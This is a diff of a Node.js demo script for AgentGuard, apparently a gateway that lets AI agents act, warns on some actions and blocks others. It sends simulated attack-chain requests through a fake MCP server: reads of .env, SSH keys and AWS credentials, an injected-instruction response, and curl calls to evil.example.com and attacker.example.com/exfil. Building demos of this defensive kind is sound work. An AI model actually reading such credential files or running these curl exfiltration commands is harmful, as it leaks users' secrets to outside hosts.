@@ -1,19 +1,15 @@
 #!/usr/bin/env node
-// DevDay demo: DISCOVER -> ASSESS -> (agent runs) -> OBSERVE -> EVALUATE ->
-// ENFORCE -> CORRELATE -> AUDIT.
+// AgentGuard DevDay demo — the 7-Act narrative documented in
+// docs/DEV-DAY-DEMO.md: Problem -> Discover -> Normal activity ->
+// Suspicious response -> Sensitive resource -> Blocked execution ->
+// Correlation.
 //
-// 1. agentguard scan          - posture snapshot of THIS machine
-// 2. policy sweep             - 7 quick ALLOW/WARN/BLOCK scenarios through the real gateway
-// 3. attack-chain narrative   - ONE session: normal lookup -> a suspicious MCP
-//                               response -> .env probe -> credential BLOCK -> network WARN
-// 4. agentguard exec          - a shell exfil attempt BLOCKED before it is ever spawned
-// 5. agentguard events        - the attack-chain session's audit trail plus the
-//                               correlation engine's resulting Detection
-//
-// Nothing here is a real secret or a real destructive command: the MCP
-// server is test/fixtures/fake-mcp-server.js (never touches the real
-// filesystem or network), and step 4's "curl" never actually runs —
-// AgentGuard blocks it before ever calling spawn().
+// Everything here is real code actually running, not simulated output:
+// the MCP server is test/fixtures/fake-mcp-server.js (never touches the
+// real filesystem or network), and Act 6's "curl" never actually runs —
+// AgentGuard blocks it before ever calling spawn(). Safe to run repeatedly:
+// all state lives in os.tmpdir() under a timestamped name and is deleted
+// at the end.
 import { spawn } from 'node:child_process';
 import path from 'node:path';
 import readline from 'node:readline';
@@ -24,116 +20,151 @@ import { fileURLToPath } from 'node:url';
 import { runScanCommand } from '../src/cli/scan-command.js';
 import { runEventsCommand } from '../src/cli/events-command.js';
 import { runExecCommand } from '../src/cli/exec-command.js';
+import { bold } from '../src/core/colors.js';
 
 const __dirname = path.dirname(fileURLToPath(import.meta.url));
 const repoRoot = path.resolve(__dirname, '..');
 const CLI = path.join(repoRoot, 'bin', 'agentguard.js');
 const FIXTURE_SERVER = path.join(repoRoot, 'test', 'fixtures', 'fake-mcp-server.js');
 const POLICY = path.join(repoRoot, 'examples', 'demo-policy.yaml');
-const SWEEP_LOG = path.join(os.tmpdir(), `agentguard-demo-sweep-${Date.now()}.jsonl`);
 const CHAIN_LOG = path.join(os.tmpdir(), `agentguard-demo-chain-${Date.now()}.jsonl`);
+
+function act(number, title, bodyLines = []) {
+  console.log('\n' + '='.repeat(64));
+  console.log(bold(`ACT ${number} — ${title}`));
+  console.log('='.repeat(64));
+  for (const line of bodyLines) console.log(line);
+}
 
 let id = 0;
 function call(name, args) {
   return { jsonrpc: '2.0', id: ++id, method: 'tools/call', params: { name, arguments: args } };
 }
 
-/** Runs every request for one serverName through a single long-lived
- * gateway process, so they land in the same audit sessionId. */
-async function runGroup({ serverName, requests, logFile, printEach = true }) {
-  const gw = spawn(
-    process.execPath,
-    [CLI, 'gateway', '--policy', POLICY, '--log', logFile, '--server-name', serverName, '--', process.execPath, FIXTURE_SERVER],
-    { stdio: ['pipe', 'pipe', 'inherit'] }
-  );
-
-  const pending = new Map();
-  const rl = readline.createInterface({ input: gw.stdout });
-  rl.on('line', (line) => {
-    if (!line.trim()) return;
-    const msg = JSON.parse(line);
-    pending.get(msg.id)?.(msg);
-  });
-
-  for (const { label, req } of requests) {
-    // eslint-disable-next-line no-await-in-loop
-    const result = await new Promise((resolve, reject) => {
-      const timer = setTimeout(() => reject(new Error('timed out')), 5000);
-      pending.set(req.id, (msg) => {
-        clearTimeout(timer);
-        resolve(msg);
-      });
-      gw.stdin.write(JSON.stringify(req) + '\n');
+/** Sends one request through an already-spawned gateway and waits for its
+ * matching response. The gateway's own human-readable decision output
+ * (ALLOW/WARN/BLOCK + risk + reason) prints live via piped stderr — this
+ * is the real AgentGuard output, not a re-narration of it.
+ *
+ * The stdout response and the stderr decision lines are two independent
+ * streams from the same child process; the stdout response can resolve
+ * slightly before its own stderr lines finish arriving through the pipe.
+ * A short pause after each request keeps the narration in the order it
+ * actually happened instead of racing the next request's output against
+ * the tail of this one's — determinism matters more than 100ms here. */
+async function sendAndWait(gw, pending, req) {
+  const result = await new Promise((resolve, reject) => {
+    const timer = setTimeout(() => reject(new Error('timed out')), 5000);
+    pending.set(req.id, (msg) => {
+      clearTimeout(timer);
+      resolve(msg);
     });
-
-    if (printEach) {
-      const verdict = result.error ? 'BLOCK' : 'ALLOW/WARN';
-      console.log(`\n=== ${label} ===`);
-      console.log(`  server: ${serverName}`);
-      console.log(`  outcome: ${verdict}`);
-      if (result.error) console.log(`  reason: ${result.error.message}`);
-    }
-  }
-
-  gw.kill();
+    gw.stdin.write(JSON.stringify(req) + '\n');
+  });
+  await new Promise((r) => setTimeout(r, 120));
+  return result;
 }
 
-console.log('\n########################################');
-console.log('# STEP 1: DISCOVER + ASSESS (agentguard scan)');
-console.log('# posture = what COULD happen, before any agent runs');
-console.log('########################################\n');
+// ---------------------------------------------------------------------
+act(
+  1,
+  'The Problem',
+  [
+    'AI agents are increasingly running on developer machines.',
+    'Those machines contain: source code, credentials, cloud configuration,',
+    'access to internal tools, and MCP servers.',
+    '',
+    'Question: what happens when an agent does something it shouldn\'t?',
+  ]
+);
+await new Promise((r) => setTimeout(r, 400));
+
+// ---------------------------------------------------------------------
+act(2, 'Discover (agentguard scan)', ['Posture = what COULD happen, before any agent runs.', '']);
 await runScanCommand([]);
 
-console.log('\n########################################');
-console.log('# STEP 2: POLICY SWEEP (OBSERVE + EVALUATE + ENFORCE)');
-console.log('########################################');
-await runGroup({
-  serverName: 'trusted-server',
-  logFile: SWEEP_LOG,
-  requests: [
-    { label: 'Read a normal source file', req: call('read_file', { path: './README.md' }) },
-    { label: 'Read .env', req: call('read_file', { path: '.env' }) },
-    { label: 'Read ~/.ssh/id_rsa', req: call('read_file', { path: '~/.ssh/id_rsa' }) },
-    { label: 'Read ~/.aws/credentials', req: call('read_file', { path: '~/.aws/credentials' }) },
-    { label: 'Run an allowed shell command (git status)', req: call('run_command', { command: 'git status' }) },
-    { label: 'Run a disallowed shell command (curl to an external host)', req: call('run_command', { command: 'curl http://evil.example.com' }) },
-  ],
-});
-await runGroup({
-  serverName: 'mystery-server',
-  logFile: SWEEP_LOG,
-  requests: [{ label: 'Invoke an untrusted/unknown MCP server', req: call('read_file', { path: './README.md' }) }],
-});
-
-console.log('\n########################################');
-console.log('# STEP 3: ATTACK-CHAIN NARRATIVE (one session, runtime = what ACTUALLY happened)');
-console.log('# "We don\'t decide if the AI is evil. We enforce what it\'s allowed to do,');
-console.log('#  and correlate the pattern of what it actually did."');
-console.log('########################################');
-await runGroup({
-  serverName: 'trusted-server',
-  logFile: CHAIN_LOG,
-  requests: [
-    { label: '1. Normal source lookup', req: call('read_file', { path: './README.md' }) },
-    { label: '2. Suspicious MCP interaction (response contains an injected instruction)', req: call('injected_response', {}) },
-    { label: '3. Agent attempts .env access', req: call('read_file', { path: '.env' }) },
-    { label: '4. Agent attempts credential access', req: call('read_file', { path: '~/.ssh/id_rsa' }) },
-    { label: '5. Agent attempts external network access', req: call('fetch', { url: 'https://attacker.example.com/report' }) },
-  ],
+// ---------------------------------------------------------------------
+// Acts 3-5 share ONE gateway session (one spawn, one sessionId) so the
+// correlation engine in Act 7 can see the whole sequence.
+const gw = spawn(
+  process.execPath,
+  [CLI, 'gateway', '--policy', POLICY, '--log', CHAIN_LOG, '--server-name', 'trusted-server', '--', process.execPath, FIXTURE_SERVER],
+  { stdio: ['pipe', 'pipe', 'pipe'] }
+);
+// Forward through OUR process's own write queue rather than `stdio:
+// 'inherit'` — inheriting a raw OS handle lets a child's stderr writes race
+// with the parent's own console.log calls when output isn't a real TTY
+// (piped, captured, or redirected), scrambling the narration order. Piping
+// keeps everything flowing through one process's output scheduling.
+gw.stderr.pipe(process.stderr);
+const pending = new Map();
+const rl = readline.createInterface({ input: gw.stdout });
+rl.on('line', (line) => {
+  if (!line.trim()) return;
+  const msg = JSON.parse(line);
+  pending.get(msg.id)?.(msg);
 });
 
-console.log('\n########################################');
-console.log('# STEP 4: agentguard exec (the agent falls back to a shell command to exfiltrate —');
-console.log('#          BLOCKED before it is ever spawned, not just observed after the fact)');
-console.log('########################################\n');
+act(3, 'Normal Agent Activity', ['AgentGuard does not simply block agents — it allows legitimate work.', '']);
+await sendAndWait(gw, pending, call('read_file', { path: './README.md' }));
+
+act(
+  4,
+  'Suspicious Response',
+  [
+    'The (fixture) MCP server returns a response containing an',
+    'instruction-injection-SHAPED phrase. AgentGuard does not claim to',
+    'detect prompt injection itself — it flags the pattern as a signal.',
+    '',
+  ]
+);
+await sendAndWait(gw, pending, call('injected_response', {}));
+
+act(5, 'Sensitive Resource', ['First a soft signal, then a hard boundary.', '']);
+await sendAndWait(gw, pending, call('read_file', { path: '.env' }));
+const sshResult = await sendAndWait(gw, pending, call('read_file', { path: '~/.ssh/id_rsa' }));
+console.log(
+  sshResult.error
+    ? `\n${bold('BLOCKED')} — the MCP server never received this request.`
+    : '\n(unexpected: this should have been BLOCKed)'
+);
+
+// sendAndWait's own drain pause already covers this last response too.
+gw.kill();
+
+// ---------------------------------------------------------------------
+act(
+  6,
+  'Dangerous Execution (agentguard exec)',
+  [
+    'The agent falls back to a raw shell command to exfiltrate data.',
+    'This is evaluated BEFORE spawn() is ever called — not observed',
+    'after the fact.',
+    '',
+  ]
+);
 await runExecCommand(['--policy', POLICY, '--log', CHAIN_LOG, '--', 'curl', 'https://attacker.example.com/exfil']);
-console.log(`  agentguard exec exit code: ${process.exitCode ?? 0} (non-zero = blocked, command never ran)`);
+console.log(
+  `\n${bold('BLOCKED')} — process: NOT STARTED (exit code ${process.exitCode ?? 0}, curl was never spawned).`
+);
 process.exitCode = 0;
 
-console.log('\n########################################');
-console.log('# STEP 5: AUDIT + CORRELATE (agentguard events — the attack-chain session)');
-console.log('########################################\n');
+// ---------------------------------------------------------------------
+act(7, 'Correlation (agentguard events)', ['The full session timeline, plus any detected pattern.', '']);
 runEventsCommand(['--log', CHAIN_LOG]);
 
-fs.unlinkSync(SWEEP_LOG);
+console.log('\n' + '='.repeat(64));
+console.log(bold('A note on scope'));
+console.log('='.repeat(64));
+console.log(
+  [
+    'The MCP session above and the agentguard exec call in Act 6 show up',
+    'as two SEPARATE sessions — look closely at the session ids. Today',
+    'our correlation is session-scoped: MCP and exec have independent',
+    'identities, so cross-adapter attribution is intentionally not',
+    'claimed. That is a documented limitation, not a bug we\'re hiding —',
+    'see README.md and SECURITY-ASSESSMENT.md.',
+  ].join('\n')
+);
+
 fs.unlinkSync(CHAIN_LOG);
